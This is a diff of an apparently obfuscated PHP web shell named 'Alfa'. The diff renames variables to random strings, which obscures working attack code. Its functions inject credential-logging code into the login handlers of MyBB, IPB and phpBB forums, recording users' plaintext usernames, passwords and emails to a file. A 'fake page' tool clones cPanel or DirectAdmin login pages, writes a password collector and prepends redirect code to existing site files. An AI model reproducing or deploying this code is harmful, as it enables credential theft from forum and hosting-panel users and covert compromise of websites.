+if(!strstr($nvkkuaxh7f224eabb16b0fbd15c7dd7b8da65d26,'?>'))$nndigmblc13367945d5d4c91047b3b50234aa7ab = '?>'.$nndigmblc13367945d5d4c91047b3b50234aa7ab;
+$jrxlehha3f2cd132c83b89b33f485e035b5bff84 = $nvkkuaxh7f224eabb16b0fbd15c7dd7b8da65d26."\n".$nndigmblc13367945d5d4c91047b3b50234aa7ab;
+@file_put_contents($evugkozj3a8e4c06e471595f6eb262bb9b5582d9, $jrxlehha3f2cd132c83b89b33f485e035b5bff84);
+hijackOutput(0,$wgcxhsoqac72b865603145ad0871f59f6d06a776);
 }else{
 hijackOutput(1);
 }
 }
-function hijackIPB($path,$saveto){
-$code = '$Alfa_q = $this->DB->buildAndFetch(array(\'select\' => \'email\', \'from\' => \'members\', \'where\' => \'name="\'.$username.\'" OR email="\'.$email.\'"\'));$Alfa_file = "{saveto_path}";$fp = @fopen($Alfa_file, "a+");@fwrite($fp, $_POST[\'ips_username\'].\' : \'.$_POST[\'ips_password\'].\' ( \'.$Alfa_q[\'email\'].\' )\'."\n");@fclose($fp);$f = @file($Alfa_file);$new = array_unique($f);$fp = @fopen($Alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);';
-$find = 'unset( $member[\'plainPassword\'] );';
-$code=str_replace('{saveto_path}',$saveto,$code);
-$login=$path."/admin/sources/handlers/han_login.php";
-$evil_login = "\t".$find."\n\t".$code;
-if(@is_file($login) AND @is_writable($login)){
-$data_login = @file_get_contents($login);
-if(strstr($data_login, $find)){
-$login_replace = str_replace($find,$evil_login, $data_login);
-@file_put_contents($login, $login_replace);
-hijackOutput(0,$saveto);
+function hijackMybb($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485,$wgcxhsoqac72b865603145ad0871f59f6d06a776){
+$nndigmblc13367945d5d4c91047b3b50234aa7ab = '$alfa_q = $db->query("SELECT `email` FROM ".TABLE_PREFIX."users WHERE `username` = \'".$user[\'username\']."\'");$alfa_fetch = $db->fetch_array($alfa_q);$alfa_file = "{saveto_path}";$fp = @fopen($alfa_file, "a+");@fwrite($fp, $user[\'username\']." : ". $user[\'password\']." ( ".$alfa_fetch[\'email\']." )\n");@fclose($fp);$f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fwrite($fp, $values);}@fclose($fp);';
+$tpwrlifnea170e2cafb1337755c8b3d5ae4437f4 = '$loginhandler->complete_login();';
+$nndigmblc13367945d5d4c91047b3b50234aa7ab=str_replace('{saveto_path}',$wgcxhsoqac72b865603145ad0871f59f6d06a776,$nndigmblc13367945d5d4c91047b3b50234aa7ab);
+$predzshad56b699830e77ba53855679cb1d252da=$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485."/member.php";
+$uwdiozugf5a48ef92b35de034fdf7ff052412fbb = "\t".$nndigmblc13367945d5d4c91047b3b50234aa7ab."\n\t".$tpwrlifnea170e2cafb1337755c8b3d5ae4437f4;
+if(@is_file($predzshad56b699830e77ba53855679cb1d252da) AND @is_writable($predzshad56b699830e77ba53855679cb1d252da)){
+$pylqbhytf29de8859fa34b6b370a904615dfd949 = @file_get_contents($predzshad56b699830e77ba53855679cb1d252da);
+if(strstr($pylqbhytf29de8859fa34b6b370a904615dfd949, $tpwrlifnea170e2cafb1337755c8b3d5ae4437f4)){
+$arcxbuvs5646bf90053257c69df1a3ccdb5a549e = str_replace($tpwrlifnea170e2cafb1337755c8b3d5ae4437f4,$uwdiozugf5a48ef92b35de034fdf7ff052412fbb, $pylqbhytf29de8859fa34b6b370a904615dfd949);
+@file_put_contents($predzshad56b699830e77ba53855679cb1d252da, $arcxbuvs5646bf90053257c69df1a3ccdb5a549e);
+hijackOutput(0,$wgcxhsoqac72b865603145ad0871f59f6d06a776);
 }else{
 hijackOutput(1);
 }
@@ -5656,18 +5710,18 @@ hijackOutput(1);
 hijackOutput(1);
 }
 }
-function hijackPHPBB($path,$saveto){
-$code = '$Alfa_u = request_var(\'username\', \'\');$Alfa_p = request_var(\'password\', \'\');if($Alfa_u != \'\' AND $Alfa_p != \'\'){$Alfa_response = $auth->login($Alfa_u,$Alfa_p);if($Alfa_response[\'status\'] == LOGIN_SUCCESS){$Alfa_file ="{saveto_path}";$fp = @fopen($Alfa_file, "a+");@fwrite($fp, $Alfa_u." : ".$Alfa_p. " ( ".$Alfa_response[\'user_row\'][\'user_email\']." )\n");@fclose($fp);$f = @file($Alfa_file);$new = array_unique($f);$fp = @fopen($Alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}}';
-$find = 'case \'login\':';
-$code=str_replace('{saveto_path}',$saveto,$code);
-$login=$path."/ucp.php";
-$evil_login = "\t".$find."\n\t".$code;
-if(@is_file($login) AND @is_writable($login)){
-$data_login = @file_get_contents($login);
-if(strstr($data_login, $find)){
-$login_replace = str_replace($find,$evil_login, $data_login);
-@file_put_contents($login, $login_replace);
-hijackOutput(0,$saveto);
+function hijackIPB($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485,$wgcxhsoqac72b865603145ad0871f59f6d06a776){
+$nndigmblc13367945d5d4c91047b3b50234aa7ab = '$Alfa_q = $this->DB->buildAndFetch(array(\'select\' => \'email\', \'from\' => \'members\', \'where\' => \'name="\'.$username.\'" OR email="\'.$email.\'"\'));$Alfa_file = "{saveto_path}";$fp = @fopen($Alfa_file, "a+");@fwrite($fp, $_POST[\'ips_username\'].\' : \'.$_POST[\'ips_password\'].\' ( \'.$Alfa_q[\'email\'].\' )\'."\n");@fclose($fp);$f = @file($Alfa_file);$new = array_unique($f);$fp = @fopen($Alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);';
+$tpwrlifnea170e2cafb1337755c8b3d5ae4437f4 = 'unset( $member[\'plainPassword\'] );';
+$nndigmblc13367945d5d4c91047b3b50234aa7ab=str_replace('{saveto_path}',$wgcxhsoqac72b865603145ad0871f59f6d06a776,$nndigmblc13367945d5d4c91047b3b50234aa7ab);
+$predzshad56b699830e77ba53855679cb1d252da=$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485."/admin/sources/handlers/han_login.php";
+$uwdiozugf5a48ef92b35de034fdf7ff052412fbb = "\t".$tpwrlifnea170e2cafb1337755c8b3d5ae4437f4."\n\t".$nndigmblc13367945d5d4c91047b3b50234aa7ab;
+if(@is_file($predzshad56b699830e77ba53855679cb1d252da) AND @is_writable($predzshad56b699830e77ba53855679cb1d252da)){
+$pylqbhytf29de8859fa34b6b370a904615dfd949 = @file_get_contents($predzshad56b699830e77ba53855679cb1d252da);
+if(strstr($pylqbhytf29de8859fa34b6b370a904615dfd949, $tpwrlifnea170e2cafb1337755c8b3d5ae4437f4)){
+$arcxbuvs5646bf90053257c69df1a3ccdb5a549e = str_replace($tpwrlifnea170e2cafb1337755c8b3d5ae4437f4,$uwdiozugf5a48ef92b35de034fdf7ff052412fbb, $pylqbhytf29de8859fa34b6b370a904615dfd949);
+@file_put_contents($predzshad56b699830e77ba53855679cb1d252da, $arcxbuvs5646bf90053257c69df1a3ccdb5a549e);
+hijackOutput(0,$wgcxhsoqac72b865603145ad0871f59f6d06a776);
 }else{
 hijackOutput(1);
 }
@@ -5675,28 +5729,47 @@ hijackOutput(1);
 hijackOutput(1);
 }
 }
-function hijackOutput($c=0,$p=''){echo($c==0?"<center><font color='green'>Success</font> --> path: $p</center>":'<center><font color="red">Error in inject code !</font></center>');}
-function Alfa_StrSearcher($dir,$string,$ext,$e,$arr=array()){
-if(@is_dir($dir)){
-$files=@scandir($dir);
-foreach($files as $key => $value){
-$path=@realpath($dir. DIRECTORY_SEPARATOR .$value);
-if(!@is_dir($path)){
-if($ext!='*'){$f = basename($path);$f = explode('.',$f);$f = end($f);if($f!=$ext)continue;}
-if($e=='str'){
-$content = @file_get_contents($path);
-if(strpos($content, $string) !== false){
-echo str_replace('\\','/',$path) . "<br>";
+function hijackPHPBB($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485,$wgcxhsoqac72b865603145ad0871f59f6d06a776){
+$nndigmblc13367945d5d4c91047b3b50234aa7ab = '$Alfa_u = request_var(\'username\', \'\');$Alfa_p = request_var(\'password\', \'\');if($Alfa_u != \'\' AND $Alfa_p != \'\'){$Alfa_response = $auth->login($Alfa_u,$Alfa_p);if($Alfa_response[\'status\'] == LOGIN_SUCCESS){$Alfa_file ="{saveto_path}";$fp = @fopen($Alfa_file, "a+");@fwrite($fp, $Alfa_u." : ".$Alfa_p. " ( ".$Alfa_response[\'user_row\'][\'user_email\']." )\n");@fclose($fp);$f = @file($Alfa_file);$new = array_unique($f);$fp = @fopen($Alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}}';
+$tpwrlifnea170e2cafb1337755c8b3d5ae4437f4 = 'case \'login\':';
+$nndigmblc13367945d5d4c91047b3b50234aa7ab=str_replace('{saveto_path}',$wgcxhsoqac72b865603145ad0871f59f6d06a776,$nndigmblc13367945d5d4c91047b3b50234aa7ab);
+$predzshad56b699830e77ba53855679cb1d252da=$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485."/ucp.php";
+$uwdiozugf5a48ef92b35de034fdf7ff052412fbb = "\t".$tpwrlifnea170e2cafb1337755c8b3d5ae4437f4."\n\t".$nndigmblc13367945d5d4c91047b3b50234aa7ab;
+if(@is_file($predzshad56b699830e77ba53855679cb1d252da) AND @is_writable($predzshad56b699830e77ba53855679cb1d252da)){
+$pylqbhytf29de8859fa34b6b370a904615dfd949 = @file_get_contents($predzshad56b699830e77ba53855679cb1d252da);
+if(strstr($pylqbhytf29de8859fa34b6b370a904615dfd949, $tpwrlifnea170e2cafb1337755c8b3d5ae4437f4)){
+$arcxbuvs5646bf90053257c69df1a3ccdb5a549e = str_replace($tpwrlifnea170e2cafb1337755c8b3d5ae4437f4,$uwdiozugf5a48ef92b35de034fdf7ff052412fbb, $pylqbhytf29de8859fa34b6b370a904615dfd949);
+@file_put_contents($predzshad56b699830e77ba53855679cb1d252da, $arcxbuvs5646bf90053257c69df1a3ccdb5a549e);
+hijackOutput(0,$wgcxhsoqac72b865603145ad0871f59f6d06a776);
+}else{
+hijackOutput(1);
 }
 }else{
-if(strstr($value,$string)){
-echo str_replace('\\','/',$path) . "<br>";
+hijackOutput(1);
 }
 }
-$results[] = $path;
-}elseif($value != "." && $value != "..") {
-Alfa_StrSearcher($path,$string,$ext,$e,$results);
-$results[] = $path;
+function hijackOutput($yyphbkaj4a8a08f09d37b73795649038408b5f33=0,$fxuvmwpb83878c91171338902e0fe0fb97a8c47a=''){echo($yyphbkaj4a8a08f09d37b73795649038408b5f33==0?"<center><font color='green'>Success</font> --> path: $fxuvmwpb83878c91171338902e0fe0fb97a8c47a</center>":'<center><font color="red">Error in inject code !</font></center>');}
+function Alfa_StrSearcher($ofvepnxk736007832d2167baaae763fd3a3f3cf1,$syvgjxtsb45cffe084dd3d20d928bee85e7b0f21,$uzehrcsaabf77184f55403d75b9d51d79162a7ca,$qxcuilgde1671797c52e15f763380b45e841ec32,$dtuckrvi47c80780ab608cc046f2a6e6f071feb6=array()){
+if(@is_dir($ofvepnxk736007832d2167baaae763fd3a3f3cf1)){
+$blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1=@scandir($ofvepnxk736007832d2167baaae763fd3a3f3cf1);
+foreach($blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1 as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d => $rkptsoeg2063c1608d6e0baf80249c42e2be5804){
+$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485=@realpath($ofvepnxk736007832d2167baaae763fd3a3f3cf1. DIRECTORY_SEPARATOR .$rkptsoeg2063c1608d6e0baf80249c42e2be5804);
+if(!@is_dir($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485)){
+if($uzehrcsaabf77184f55403d75b9d51d79162a7ca!='*'){$npviloqa8fa14cdd754f91cc6554c9e71929cce7 = basename($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485);$npviloqa8fa14cdd754f91cc6554c9e71929cce7 = explode('.',$npviloqa8fa14cdd754f91cc6554c9e71929cce7);$npviloqa8fa14cdd754f91cc6554c9e71929cce7 = end($npviloqa8fa14cdd754f91cc6554c9e71929cce7);if($npviloqa8fa14cdd754f91cc6554c9e71929cce7!=$uzehrcsaabf77184f55403d75b9d51d79162a7ca)continue;}
+if($qxcuilgde1671797c52e15f763380b45e841ec32=='str'){
+$mveevork9a0364b9e99bb480dd25e1f0284c8555 = @file_get_contents($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485);
+if(strpos($mveevork9a0364b9e99bb480dd25e1f0284c8555, $syvgjxtsb45cffe084dd3d20d928bee85e7b0f21) !== false){
+echo str_replace('\\','/',$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485) . "<br>";
+}
+}else{
+if(strstr($rkptsoeg2063c1608d6e0baf80249c42e2be5804,$syvgjxtsb45cffe084dd3d20d928bee85e7b0f21)){
+echo str_replace('\\','/',$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485) . "<br>";
+}
+}
+$mkkbxqmk53e61336bb49ec978968786b07dea50b[] = $jwzcflrpd6fe1d0be6347b8ef2427fa629c04485;
+}elseif($rkptsoeg2063c1608d6e0baf80249c42e2be5804 != "." && $rkptsoeg2063c1608d6e0baf80249c42e2be5804 != "..") {
+Alfa_StrSearcher($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485,$syvgjxtsb45cffe084dd3d20d928bee85e7b0f21,$uzehrcsaabf77184f55403d75b9d51d79162a7ca,$qxcuilgde1671797c52e15f763380b45e841ec32,$mkkbxqmk53e61336bb49ec978968786b07dea50b);
+$mkkbxqmk53e61336bb49ec978968786b07dea50b[] = $jwzcflrpd6fe1d0be6347b8ef2427fa629c04485;
 }}}}
 function alfafakepage(){
 	alfahead();
@@ -5704,8 +5777,8 @@ function alfafakepage(){
 	echo '<div class=header><br>
 	<center><div class="txtfont_header">| Host Manager Fake page |</div></center><br><br><form onSubmit="g(\'fakepage\',null,this.clone_page.value,this.fake_root.value,\'>>\',this.logto.value,this.panel.value,this.inject_to.value,this.bind_on.value,this.count.value);return false;" method=\'post\'>
 	<div class="txtfont" style="position: relative;left: 50%;transform: translate(-50%);"><div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Panel: </span><select style="width:100px;" name="panel">';
-	$cm_array = array("cpanel"=>"Cpanel","directadmin"=>"DirectAdmin");
-	foreach($cm_array as $key=>$val)echo '<option value="'.$key.'">'.$val.'</option>';
+	$dbaqodsdf0a8d484466c281c1a9087b40aacc270 = array("cpanel"=>"Cpanel","directadmin"=>"DirectAdmin");
+	foreach($dbaqodsdf0a8d484466c281c1a9087b40aacc270 as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d=>$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf)echo '<option value="'.$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d.'">'.$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf.'</option>';
 	echo("</select></div>");
 	echo '<div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Clone page: </span><input size="50" type="text" name="clone_page" placeholder="eg: https://target.com:2083 | https://target.com:2222"></div>
 	<div style="margin-bottom:6px;"><span>Fake page root: </span><input size="50" type="text" name="fake_root" value="'.$_SERVER["DOCUMENT_ROOT"].'/fake_page_root/"></div>
@@ -5714,81 +5787,81 @@ function alfafakepage(){
 	<div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Log To: </span><input size="50" type="text" name="logto" value="'.$GLOBALS['cwd'].'logs.txt"></div>
 	<div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Count of Invalid login: </span><input size="20" type="text" name="count" value="3" style="text-align:center;"></div>
 	<div style="text-align:center;"><input type="submit" name="btn" value=" "></div></div></form><br>';
-	$clone_page = $_POST['alfa1'];
-	$fake_root = $_POST['alfa2'];
-	$logto = $_POST['alfa4'];
-	$panel = $_POST['alfa5'];
-	$inject_to = $_POST['alfa6'];
-	$bind_on = $_POST['alfa7'];
-	$count = $_POST['alfa8'];
-	if(!empty($clone_page) && !empty($fake_root) && !empty($logto) && !empty($inject_to) && !empty($bind_on) && $_POST['alfa3'] == '>>'){
+	$cpclacod18a3a63ab9093331c3bbb35d95b48f5a = $_POST['alfa1'];
+	$giccknfx44239c782ffe4a36e342c8c3e1326a9a = $_POST['alfa2'];
+	$jrmfbbdrb24f0fd76c0472d06da946830bfc42f8 = $_POST['alfa4'];
+	$vziqiytnf1e5d7a5fe13498abbdeb0f1f19136a8 = $_POST['alfa5'];
+	$rsrdomkl05e5d48c29dbcc9990cbe63e42eee645 = $_POST['alfa6'];
+	$zqvfossy2c010a42dd83ed91e18624886208bc40 = $_POST['alfa7'];
+	$gstvxiofe2942a04780e223b215eb8b663cf5353 = $_POST['alfa8'];
+	if(!empty($cpclacod18a3a63ab9093331c3bbb35d95b48f5a) && !empty($giccknfx44239c782ffe4a36e342c8c3e1326a9a) && !empty($jrmfbbdrb24f0fd76c0472d06da946830bfc42f8) && !empty($rsrdomkl05e5d48c29dbcc9990cbe63e42eee645) && !empty($zqvfossy2c010a42dd83ed91e18624886208bc40) && $_POST['alfa3'] == '>>'){
 		echo __pre();
-		$target = $clone_page;
-		$curl = new AlfaCURL();
-		$source_page = $curl->Send($target);
-		if(!empty($source_page)){
-			$matched_form = "";
-			if($panel == "cpanel"){
-				if(preg_match('#<form(.*)id="login_form"(.*)>#', $source_page, $match)){
-					$matched_form = $match[0];
+		$nyvfphvm42aefbae01d2dfd981f7da7d823d689e = $cpclacod18a3a63ab9093331c3bbb35d95b48f5a;
+		$qqhrnrcwf6e57c9de709e45feb0d955351f53548 = new AlfaCURL();
+		$cwcyfsjb789ff4a739b4aad886655656044989ae = $qqhrnrcwf6e57c9de709e45feb0d955351f53548->Send($nyvfphvm42aefbae01d2dfd981f7da7d823d689e);
+		if(!empty($cwcyfsjb789ff4a739b4aad886655656044989ae)){
+			$arpfcmqm7dc357be275bd318c2bbc4ca17475967 = "";
+			if($vziqiytnf1e5d7a5fe13498abbdeb0f1f19136a8 == "cpanel"){
+				if(preg_match('#<form(.*)id="login_form"(.*)>#', $cwcyfsjb789ff4a739b4aad886655656044989ae, $ppwzlnqze3cc92c14a5e6dd1a7d94b6ff634d7fc)){
+					$arpfcmqm7dc357be275bd318c2bbc4ca17475967 = $ppwzlnqze3cc92c14a5e6dd1a7d94b6ff634d7fc[0];
 				}
 			}else{
-				if(preg_match('#<form(.*?)>#', $source_page, $match)){
-					$matched_form = $match[0];
+				if(preg_match('#<form(.*?)>#', $cwcyfsjb789ff4a739b4aad886655656044989ae, $ppwzlnqze3cc92c14a5e6dd1a7d94b6ff634d7fc)){
+					$arpfcmqm7dc357be275bd318c2bbc4ca17475967 = $ppwzlnqze3cc92c14a5e6dd1a7d94b6ff634d7fc[0];
 				}
 			}
-			if(!empty($matched_form)){
-				$fake = "";
-				$pwd = str_replace($_SERVER["DOCUMENT_ROOT"], '', $fake_root);
-				$uri = str_replace($_SERVER["DOCUMENT_ROOT"], '', $inject_to);
-				if($panel == "cpanel"){
-					$port = "2083";
+			if(!empty($arpfcmqm7dc357be275bd318c2bbc4ca17475967)){
+				$qnhavdjg144c9defac04969c7bfad8efaa8ea194 = "";
+				$mevhntrj9003d1df22eb4d3820015070385194c8 = str_replace($_SERVER["DOCUMENT_ROOT"], '', $giccknfx44239c782ffe4a36e342c8c3e1326a9a);
+				$wtsjcykq9305b73d359bd06734fee0b3638079e1 = str_replace($_SERVER["DOCUMENT_ROOT"], '', $rsrdomkl05e5d48c29dbcc9990cbe63e42eee645);
+				if($vziqiytnf1e5d7a5fe13498abbdeb0f1f19136a8 == "cpanel"){
+					$fbwqabyz901555fb06e346cb065ceb9808dcfc25 = "2083";
 				}else{
-					$target = str_replace(array("http://", "https://"), "", $target);
-					$port = explode(":",$target);
-					$port = $port[1];
+					$nyvfphvm42aefbae01d2dfd981f7da7d823d689e = str_replace(array("http://", "https://"), "", $nyvfphvm42aefbae01d2dfd981f7da7d823d689e);
+					$fbwqabyz901555fb06e346cb065ceb9808dcfc25 = explode(":",$nyvfphvm42aefbae01d2dfd981f7da7d823d689e);
+					$fbwqabyz901555fb06e346cb065ceb9808dcfc25 = $fbwqabyz901555fb06e346cb065ceb9808dcfc25[1];
 				}
-				if(substr($uri, 0, 1) == "/"){
-					$uri = substr($uri, 1);
+				if(substr($wtsjcykq9305b73d359bd06734fee0b3638079e1, 0, 1) == "/"){
+					$wtsjcykq9305b73d359bd06734fee0b3638079e1 = substr($wtsjcykq9305b73d359bd06734fee0b3638079e1, 1);
 				}
-				$uri = $_SERVER["HTTP_ORIGIN"] . '/' . str_replace("index.php", "", $uri) . '?:' . $port;
-				$log_url = $_SERVER["HTTP_ORIGIN"] . $pwd . '/log.php';
-				if($panel == "cpanel"){
-					$form = '<form novalidate id="login_form" action="'.$log_url.'" method="post" target="_top" style="visibility:">';
+				$wtsjcykq9305b73d359bd06734fee0b3638079e1 = $_SERVER["HTTP_ORIGIN"] . '/' . str_replace("index.php", "", $wtsjcykq9305b73d359bd06734fee0b3638079e1) . '?:' . $fbwqabyz901555fb06e346cb065ceb9808dcfc25;
+				$lbvowlpz2801df5ede9768e23fa6086d28f6da48 = $_SERVER["HTTP_ORIGIN"] . $mevhntrj9003d1df22eb4d3820015070385194c8 . '/log.php';
+				if($vziqiytnf1e5d7a5fe13498abbdeb0f1f19136a8 == "cpanel"){
+					$zuviobxn3fcdb73d36d54f2cc22d0f68e6b6e182 = '<form novalidate id="login_form" action="'.$lbvowlpz2801df5ede9768e23fa6086d28f6da48.'" method="post" target="_top" style="visibility:">';
 				}else{
-					$form = '<form action="'.$log_url.'" method="post">';
+					$zuviobxn3fcdb73d36d54f2cc22d0f68e6b6e182 = '<form action="'.$lbvowlpz2801df5ede9768e23fa6086d28f6da48.'" method="post">';
 				}
-				$fake = str_replace($matched_form, $form, $source_page);
-				if(@!is_dir($fake_root)){
-					@mkdir($fake_root, 0777, true);
-				}
-
-				$cookie_name = "alfa_fakepage_counter" . rand(9999,99999);
-
-				$post_user = 'user';
-				$post_pass = 'pass';
-				$resp_code = 'if(empty($user)){http_response_code(400);echo json_encode(array("message" => "no_username"));}else{http_response_code(401);}';
-				if($panel != "cpanel"){
-					$post_user = 'username';
-					$post_pass = 'password';
-					$resp_code = '@header("Location: ".$_SERVER[\'HTTP_REFERER\']);';
+				$qnhavdjg144c9defac04969c7bfad8efaa8ea194 = str_replace($arpfcmqm7dc357be275bd318c2bbc4ca17475967, $zuviobxn3fcdb73d36d54f2cc22d0f68e6b6e182, $cwcyfsjb789ff4a739b4aad886655656044989ae);
+				if(@!is_dir($giccknfx44239c782ffe4a36e342c8c3e1326a9a)){
+					@mkdir($giccknfx44239c782ffe4a36e342c8c3e1326a9a, 0777, true);
 				}
 
-				$cpanel_log = '<?php $cook_time = time()+(86400 * 7); $user = $_POST["'.$post_user.'"];$pass = $_POST["'.$post_pass.'"];if(!empty($user) && !empty($pass)){if(!isset($_COOKIE["'.$cookie_name.'"])){@setcookie("'.$cookie_name.'", 0, $cook_time, "/");$_COOKIE["'.$cookie_name.'"]=1;}if((int)$_COOKIE["'.$cookie_name.'"]>'.$count.'){@header("Location: /");exit;}@setcookie("'.$cookie_name.'", ((int)$_COOKIE["'.$cookie_name.'"] + 1), $cook_time, "/");$fp = @fopen("'.$logto.'", "a+");@fwrite($fp, $user . " : " . $pass . "\n");fclose($fp);sleep(3);'.$resp_code.'exit;}?>';
+				$pngomgwqe3cb9741ffde596f46710a5d7e3ec587 = "alfa_fakepage_counter" . rand(9999,99999);
 
-				@file_put_contents($fake_root.'/log.php', $cpanel_log);
-
-				if($panel == "cpanel"){
-					$fake = preg_replace(array('#<link(.*)href="(.*)"(.*)>#', '#<img class="main-logo" src="(.*)"(.*)>#', '# <a(.*)id="reset_password">#'), array('<link href="'.$target.'/$2">', '<img class="main-logo" src="'.$target.'/$1" alt="logo" />', '<a href="#" id="reset_password">'), $fake);
+				$cskdgglw505be881b902b25238ba9023d9880598 = 'user';
+				$yvivjrhz19147c5b9c1af3d2df41c251d9a4afa9 = 'pass';
+				$ubekkrtm61749cce4755c9861e76d96d933b2f7a = 'if(empty($user)){http_response_code(400);echo json_encode(array("message" => "no_username"));}else{http_response_code(401);}';
+				if($vziqiytnf1e5d7a5fe13498abbdeb0f1f19136a8 != "cpanel"){
+					$cskdgglw505be881b902b25238ba9023d9880598 = 'username';
+					$yvivjrhz19147c5b9c1af3d2df41c251d9a4afa9 = 'password';
+					$ubekkrtm61749cce4755c9861e76d96d933b2f7a = '@header("Location: ".$_SERVER[\'HTTP_REFERER\']);';
 				}
 
-				@file_put_contents($fake_root.'/index.php', $fake);
+				$zwnpfvwzef6ccbdea09f606dcae5b309fff3aa9b = '<?php $cook_time = time()+(86400 * 7); $user = $_POST["'.$cskdgglw505be881b902b25238ba9023d9880598.'"];$pass = $_POST["'.$yvivjrhz19147c5b9c1af3d2df41c251d9a4afa9.'"];if(!empty($user) && !empty($pass)){if(!isset($_COOKIE["'.$pngomgwqe3cb9741ffde596f46710a5d7e3ec587.'"])){@setcookie("'.$pngomgwqe3cb9741ffde596f46710a5d7e3ec587.'", 0, $cook_time, "/");$_COOKIE["'.$pngomgwqe3cb9741ffde596f46710a5d7e3ec587.'"]=1;}if((int)$_COOKIE["'.$pngomgwqe3cb9741ffde596f46710a5d7e3ec587.'"]>'.$gstvxiofe2942a04780e223b215eb8b663cf5353.'){@header("Location: /");exit;}@setcookie("'.$pngomgwqe3cb9741ffde596f46710a5d7e3ec587.'", ((int)$_COOKIE["'.$pngomgwqe3cb9741ffde596f46710a5d7e3ec587.'"] + 1), $cook_time, "/");$fp = @fopen("'.$jrmfbbdrb24f0fd76c0472d06da946830bfc42f8.'", "a+");@fwrite($fp, $user . " : " . $pass . "\n");fclose($fp);sleep(3);'.$ubekkrtm61749cce4755c9861e76d96d933b2f7a.'exit;}?>';
 
-				$inject_code = '<?php if(isset($_GET[":2083"])&&(int)$_COOKIE["'.$cookie_name.'"]<'.$count.'){@include("'.$fake_root.'/index.php");exit;}?>';
-				$bind_on_code = '<?php if((int)$_COOKIE["'.$cookie_name.'"]<'.$count.'){@header("Location: '.$uri.'");exit;}?>';
+				@file_put_contents($giccknfx44239c782ffe4a36e342c8c3e1326a9a.'/log.php', $zwnpfvwzef6ccbdea09f606dcae5b309fff3aa9b);
 
-				@file_put_contents($inject_to, $inject_code . "\n" .@file_get_contents($inject_to));
-				@file_put_contents($bind_on, $bind_on_code . "\n" .@file_get_contents($bind_on));
+				if($vziqiytnf1e5d7a5fe13498abbdeb0f1f19136a8 == "cpanel"){
+					$qnhavdjg144c9defac04969c7bfad8efaa8ea194 = preg_replace(array('#<link(.*)href="(.*)"(.*)>#', '#<img class="main-logo" src="(.*)"(.*)>#', '# <a(.*)id="reset_password">#'), array('<link href="'.$nyvfphvm42aefbae01d2dfd981f7da7d823d689e.'/$2">', '<img class="main-logo" src="'.$nyvfphvm42aefbae01d2dfd981f7da7d823d689e.'/$1" alt="logo" />', '<a href="#" id="reset_password">'), $qnhavdjg144c9defac04969c7bfad8efaa8ea194);
+				}
+
+				@file_put_contents($giccknfx44239c782ffe4a36e342c8c3e1326a9a.'/index.php', $qnhavdjg144c9defac04969c7bfad8efaa8ea194);
+
+				$cdyrsnui7ef52bf2c386fc29fd62d36b604aac39 = '<?php if(isset($_GET[":2083"])&&(int)$_COOKIE["'.$pngomgwqe3cb9741ffde596f46710a5d7e3ec587.'"]<'.$gstvxiofe2942a04780e223b215eb8b663cf5353.'){@include("'.$giccknfx44239c782ffe4a36e342c8c3e1326a9a.'/index.php");exit;}?>';
+				$tdfrmmae425c4ba0986b77c882762bfe683f57d0 = '<?php if((int)$_COOKIE["'.$pngomgwqe3cb9741ffde596f46710a5d7e3ec587.'"]<'.$gstvxiofe2942a04780e223b215eb8b663cf5353.'){@header("Location: '.$wtsjcykq9305b73d359bd06734fee0b3638079e1.'");exit;}?>';
+
+				@file_put_contents($rsrdomkl05e5d48c29dbcc9990cbe63e42eee645, $cdyrsnui7ef52bf2c386fc29fd62d36b604aac39 . "\n" .@file_get_contents($rsrdomkl05e5d48c29dbcc9990cbe63e42eee645));
+				@file_put_contents($zqvfossy2c010a42dd83ed91e18624886208bc40, $tdfrmmae425c4ba0986b77c882762bfe683f57d0 . "\n" .@file_get_contents($zqvfossy2c010a42dd83ed91e18624886208bc40));
 
 				echo "success...!";
 			}else{
@@ -5803,66 +5876,66 @@ function alfafakepage(){
 }
 function alfaarchive_manager(){
 	alfahead();
-	$file = $_POST['alfa2'];
-	if(!file_exists($file)){
-		$file = $GLOBALS['cwd'];
+	$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac = $_POST['alfa2'];
+	if(!file_exists($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac)){
+		$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac = $GLOBALS['cwd'];
 	}
-	$rand_id = rand(9999, 999999);
+	$acfybpuy0d8f750cfdf0ab22480f17fcd46aca1d = rand(9999, 999999);
 	echo '<div class=header><center><p><div class="txtfont_header">| Archive Manager |</div></p>';
 	echo '<form name="srch" onSubmit="g(\'archive_manager\',null,null,this.file.value,null,null,\'>>\');return false;" method=\'post\'>
 	<div class="txtfont">
-	Archive file: <input size="50" id="target" type="text" name="file" value="'.$file.'">
+	Archive file: <input size="50" id="target" type="text" name="file" value="'.$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac.'">
 	<input type="submit" name="btn" value=" "></div></form></center><br>';
 	if($_POST['alfa5']=='>>'){
 		//echo __pre();
